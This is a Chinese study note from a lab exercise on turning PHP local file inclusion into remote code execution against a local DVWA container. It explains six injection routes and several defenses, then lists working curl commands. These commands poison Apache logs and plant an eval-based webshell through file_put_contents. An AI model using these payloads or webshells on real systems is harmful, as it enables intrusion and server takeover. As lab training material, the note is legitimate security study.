# 11/23 资料：LFI 怎么变成命令执行

> 前半是白天抄的原理（全新内容）
> 后半是晚上敲的命令（只给命令，少解析）

---

# 白天部分：从「读文件」到「执行命令」

## 第一部分：为什么 LFI 读得到文件，却执行不了命令

### 1.1 include 同时做两件事

```php
include("/etc/passwd");
```

它做的事：

**第一步，读**：把 `/etc/passwd` 的字节读进来

**第二步，解析**：按 PHP 语法解析这些字节

**第三步，执行**：遇到 `<?php` 就执行，遇到普通文本就输出

### 1.2 所以 `/etc/passwd` 只是被"输出"了

`/etc/passwd` 里全是这种内容：

```
root:x:0:0:root:/root:/bin/bash
```

**没有 `<?php` 标签。**

所以 PHP 解析它时，全程处于"文本模式"——所有内容原样输出。

**你能看到内容，但没有任何代码被执行。**

### 1.3 执行命令的前提

**必须让服务器上某个文件里，含有 `<?php` 开头的代码。**

而你又不能直接上传 `.php`（上传点会拦）。

**所以思路变成：想办法把 `<?php ... ?>` 写进服务器上的某个文件，然后再 include 那个文件。**

**这就叫「LFI 转 RCE」。**

RCE = Remote Code Execution，远程代码执行。

---

## 第二部分：六条把代码写进去的路

> 按实用性排序。前两条最常用，后面几条要么有条件要么很少见。

### 路线一：日志包含（最经典）

#### 原理

**Web 服务器会把每一次请求记录进日志文件。**

日志里通常有这几种字段：

```
192.168.1.100 - - [23/Nov/2026:10:30:15 +0800] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 ..."
```

最后那一对引号里的，就是 **User-Agent**。

**User-Agent 是你发的请求头，内容完全由你控制。**

**所以：把 php 代码放进 User-Agent，它就会被写进日志文件。**

然后再 include 那个日志文件，代码就执行了。

#### 完整流程

```
① 发一个请求，User-Agent 里带 php 代码
   curl -A "<?php system('id'); ?>" http://目标/

② 服务器的 access.log 多了一行，里面有你的代码
   192.168.1.100 - - [...] "GET / HTTP/1.1" 200 1234 "-" "<?php system('id'); ?>"

③ 用 LFI 包含日志文件
   ?page=/var/log/apache2/access.log

④ include 读到日志，里面有 <?php，执行
```

#### 日志路径（不同系统不一样）

| 服务器 | 路径 |
|---|---|
| Debian/Ubuntu 的 Apache | `/var/log/apache2/access.log` |
| CentOS 的 Apache | `/var/log/httpd/access_log` |
| Nginx | `/var/log/nginx/access.log` |
| 通用（Debian 系） | `/var/log/apache2/access.log` |

**不确定就都试一遍。**

#### 局限

**一，日志可能很大。** 几百 MB 的日志，`include` 会读很久甚至超时。

**二，日志可能被转义。** 某些配置会把 UA 里的特殊字符转义，`<?php` 变成 `&lt;?php`，那就执行不了。

**三，日志权限。** web 进程必须有权限读那个文件。

**四，日志可能被截断。** 某些配置限制单行长度。

#### 为什么它是最常用的

**因为它不需要任何特殊配置。** 不需要 `allow_url_include`，不需要上传，不需要知道 session 路径。

**只要有 LFI + 能读日志，就能打。**

---

### 路线二：Session 文件包含（最隐蔽）

#### 原理

**PHP 的 session 会把数据存在服务器的文件里。**

你登录一个网站，服务器给你一个 `PHPSESSID`，同时在磁盘上创建一个文件：

```
/var/lib/php/sessions/sess_a1b2c3d4e5f6...
```

**文件内容就是 `$_SESSION` 数组序列化后的结果。**

**而 `$_SESSION` 里的数据，有时候是用户能控制的。**

#### 怎么把代码塞进 session

很多网站的登录逻辑会往 session 里写用户名：

```php
$_SESSION['username'] = $_POST['username'];
```

**如果你把用户名填成 `<?php system('id'); ?>`，它就进 session 文件了。**

然后：

```
?page=/var/lib/php/sessions/sess_你的sessionid
```

#### 为什么它最隐蔽

**因为日志文件谁都知道路径，session 路径却每个系统不一样。**

而且 session 文件通常很干净，没有历史垃圾干扰。

#### 局限

**一，得找到能往 session 写数据的入口。** 登录框、留言板、购物车都可能是。

**二，得知道 session 文件路径。** 常见几个：

```
/var/lib/php/sessions/
/var/lib/php5/sessions/
/tmp/
/var/lib/php/session/
```

**三，得知道自己的 session id。** 就是 cookie 里的 `PHPSESSID`。

**配合路径：**

```
/tmp/sess_a1b2c3d4e5f6
/var/lib/php/sessions/sess_a1b2c3d4e5f6
```

#### 这条路的实战价值

**真实渗透里，session 包含比日志包含更常用。**

因为很多网站日志被重定向到别的地方，或者权限不对；而 session 文件一定存在、一定可读（因为是 web 进程自己写的）。

---

### 路线三：php://input（需要 allow_url_include）

#### 原理

`php://input` 是 PHP 的包装器，代表 **POST 请求的原始请求体**。

```
include("php://input");
```

意思是：**把请求体当成 PHP 文件读进来执行。**

#### 怎么用

```
POST /vulnerabilities/fi/?page=php://input
Body: <?php system('id'); ?>
```

#### 条件

**需要 `allow_url_include = On`。**

这个配置在现代 PHP 里**默认是 Off**。

查当前值：

```bash
php -i | grep allow_url_include
```

#### 为什么现在很少见

PHP 5.2 之后默认关掉了，因为它太危险。

**但如果目标是老系统，或者管理员手动开了，这条路一击致命。**

---

### 路线四：data://（同样需要 allow_url_include）

#### 原理

`data://` 允许把数据直接内联在 URL 里。

#### 语法

```
data://<类型>;base64,<base64编码的内容>
```

例：

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

`PD9waHAgc3lzdGVtKCdpZCcpOz8+` 解出来是：

```php
<?php system('id');?>
```

#### 优点

**不用上传、不用找日志、不用知道 session 路径。**

**一步到位。**

#### 条件

同样需要 `allow_url_include = On`。

---

### 路线五：/proc/self/environ（需要能写环境变量）

#### 原理

Linux 的 `/proc/self/environ` 是一个虚拟文件，内容是**当前进程的环境变量**。

**Web 进程的环境变量里，包含 `HTTP_USER_AGENT`。**

#### 怎么用

```
① 发请求，UA 里带代码
   curl -A "<?php system('id'); ?>" http://目标/

② 包含 environ
   ?page=/proc/self/environ
```

#### 局限

**一，`/proc/self/` 里的 self 指"当前进程"。** 你发的请求和读 environ 的请求必须是同一个进程（同一个 PID 才保险）。

**二，现代系统上这个文件常常不可读。** 权限问题。

**三，UA 在 environ 里的位置不固定。** 可能被截断。

**这条路成功率不高，知道有它就行。**

---

### 路线六：上传临时文件竞争（需要上传点）

#### 原理

**PHP 处理文件上传时，会先把文件存到一个临时位置，等脚本处理完才删或移走。**

临时文件路径类似：

```
/tmp/phpXXXXXX
```

**这个短暂的时间窗口里，文件是存在的。**

#### 怎么用

```
① 上传一个 php 文件（会被拦，但文件已经落地到 /tmp/phpXXXXXX）
② 在同一瞬间，用 LFI 包含 /tmp/phpXXXXXX
```

**需要多线程并发：一个线程疯狂上传，另一个线程疯狂用不同文件名猜。**

#### 为什么难

**一，临时文件名是随机的。** 要爆破。

**二，窗口很短。** 毫秒级。

**三，需要大量请求。** 容易被 WAF 发现。

**这是"高难度技巧"，知道概念即可，不用花时间。**

---

## 第三部分：WebShell 管理工具（蚁剑 / 中国菜刀）

### 3.1 它们是什么

**一种图形化的 shell 客户端。**

你给它一个 URL 和一个密码，它连上你的 webshell，然后你就能：

浏览文件、上传下载、编辑文件、执行命令、连数据库

**不用每次 curl 一条命令。**

### 3.2 它们连的是什么

**必须是标准格式的 webshell。**

最常见的一行：

```php
<?php @eval($_POST['cmd']); ?>
```

拆开：

`@` —— 抑制错误输出

`eval()` —— 把字符串当 PHP 代码执行

`$_POST['cmd']` —— 从 POST 参数 `cmd` 里取内容

**所以蚁剑发一个 POST 请求，`cmd=要执行的代码`，shell 就执行它。**

### 3.3 蚁剑配置里那几项

| 字段 | 填什么 |
|---|---|
| URL | 你 shell 的完整地址 |
| 密码 | `cmd`（就是你 shell 里 `$_POST['cmd']` 那个名字） |
| 编码 | UTF-8 |
| 类型 | PHP |

**密码不是登录密码，是 shell 里那个参数名。**

### 3.4 什么时候能用

**前提是：你有一个能正常执行的 webshell 文件。**

你现在的情况：

`shell.jpg` 里是 `echo`，不是 `eval`，蚁剑连不上

你能执行它是因为改了 `FilesMatch`

**所以本地练手可以，真实环境不行。**

**真实环境拿到 shell 的两条路：**

**路一，上传 + 绕过所有检查 + 文件被解析**（你现在做的事）

**路二，LFI 转 RCE，然后写一个 shell 文件到服务器上**

```php
<?php file_put_contents('/var/www/html/shell.php', '<?php @eval($_POST["cmd"]); ?>'); ?>
```

**执行这段代码，它会在网站目录里创建一个真正的 php shell，然后蚁剑就能连了。**

### 3.5 学它的时间点

**等你稳定能拿到 shell 之后再学。**

原因：工具只是外壳，核心是“怎么把代码送进去并让它执行”。

**你现在正在学的就是这个核心。** 工具随时能学，原理过了这个村没这个店。

---

## 第四部分：防御（怎么写才防得住）

### 4.1 根本原则

**不要用用户输入当文件路径。**

### 4.2 正确的白名单

```php
$allowed = ['file1.php', 'file2.php', 'file3.php'];
if (!in_array($file, $allowed, true)) {
    die("非法请求");
}
include(__DIR__ . "/source/" . $file);
```

**三个要点：**

`in_array(..., true)` 第三参数 `true` 表示**严格比较**（类型也要一致）

`__DIR__` 拼绝对路径，防止相对路径穿越

文件名从白名单里取，不从用户输入里取

### 4.3 次优方案：路径规范化

```php
$real = realpath($base . $file);
if ($real === false || strpos($real, $base) !== 0) {
    die("非法路径");
}
```

`realpath()` 会把 `../` 解析成真实路径

`strpos($real, $base) !== 0` 检查结果是否还在允许目录内

**但这条路不如白名单稳，因为 `realpath` 有各种边界情况。**

### 4.4 关掉危险配置

```ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html
```

`open_basedir` 限制 PHP 只能访问指定目录，这一条能挡住大部分 LFI。

### 4.5 日志和 session

日志文件、session 文件应该放在 web 目录之外，且 web 进程无权读。

**但这只是缓解，不是根治。**

---

# 晚上部分：命令清单

## 0. 准备

```bash
cd ~/DVWA && docker compose ps
```

```bash
cd /tmp
rm -f c.txt
LT=$(curl -s -c c.txt http://127.0.0.1:4280/login.php | grep -oP "name='user_token' value='\K[^']+")
curl -s -b c.txt -c c.txt -d "username=admin&password=password&Login=Login&user_token=$LT" http://127.0.0.1:4280/login.php -o /dev/null
SID=$(grep PHPSESSID c.txt | awk '{print $7}')
CK="PHPSESSID=$SID; security=low"
echo "$CK"
```

**验收：`$CK` 有内容。**

---

## 1. 确认日志路径

```bash
docker exec dvwa-dvwa-1 ls -l /var/log/apache2/
```

**预期：看到 `access.log` 和 `error.log`。**

```bash
docker exec dvwa-dvwa-1 tail -3 /var/log/apache2/access.log
```

**预期：看到最近几行请求记录。**

---

## 2. 把代码写进日志

```bash
curl -A "<?php echo 'LOG_PWNED'; ?>" http://127.0.0.1:4280/
```

**验收：**

```bash
docker exec dvwa-dvwa-1 tail -2 /var/log/apache2/access.log
```

**预期：最后一行末尾能看到 `<?php echo 'LOG_PWNED'; ?>`。**

---

## 3. 包含日志，看代码是否执行

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/var/log/apache2/access.log" | tail -c 300
```

**预期：末尾出现 `LOG_PWNED`。**

**注意：日志里可能显示成 `LOG_PWNED` 或者其他形式，因为 PHP 会执行 `<?php ... ?>` 之间的内容。**

---

## 4. 换成执行命令

```bash
curl -A "<?php system(\$_GET['c']); ?>" http://127.0.0.1:4280/
```

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/var/log/apache2/access.log&c=id"
```

**预期：输出里有 `uid=33(www-data) gid=33(www-data)`。**

---

## 5. 试 whoami

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/var/log/apache2/access.log&c=whoami" | tail -c 200
```

**预期：`www-data`。**

---

## 6. 写一个真正的 webshell 到网站目录

```bash
curl -A "<?php file_put_contents('/var/www/html/hackable/uploads/final.php','<?php @eval(\$_POST[\"cmd\"]); ?>'); ?>" http://127.0.0.1:4280/
```

```bash
curl -s -H "Cookie: $CK" "http://127.0.0.1:4280/vulnerabilities/fi/?page=/var/log/apache2/access.log"
```

**验收：**

```bash
docker exec dvwa-dvwa-1 ls -l /var/www/html/hackable/uploads/final.php
```

**预期：文件存在。**

---

## 7. 用这个 shell 执行命令

```bash
curl -s -X POST -d "cmd=system('id');" http://127.0.0.1:4280/hackable/uploads/final.php
```

**预期：`uid=33(www-data)...`**

**这条通了，你就有了一个真正能被蚁剑连上的 shell。**

---

## 8. 记三行

日志包含为什么不需要 `allow_url_include`

`file_put_contents` 那一步的意义是什么

为什么 session 包含比日志包含更隐蔽

---

# 时间分配

| 时段 | 内容 |
|---|---|
| 白天碎片 | 抄第二部分六条路（重点路线一、二） |
| 白天碎片 | 抄第四部分防御（3 条要点） |
| 晚上 22:40-23:00 | 第 0-3 步（日志包含验证） |
| 晚上 23:00-23:20 | 第 4-5 步（执行 whoami/id） |
| 晚上 23:20-23:40 | 第 6-7 步（写 webshell） |
| 晚上 23:40-23:50 | 记三行 |

---

# 一句总结

**LFI 只解决"读"，RCE 要解决"写"。**

**六条路，都是在找"服务器允许我写、并且写进去之后还能被我读到"的地方。**

**日志能写（UA），session 能写（登录框），临时文件能写（上传），`php://input` 能写（请求体）。**

**找到那个"写入口"，LFI 就变成 RCE 了。**
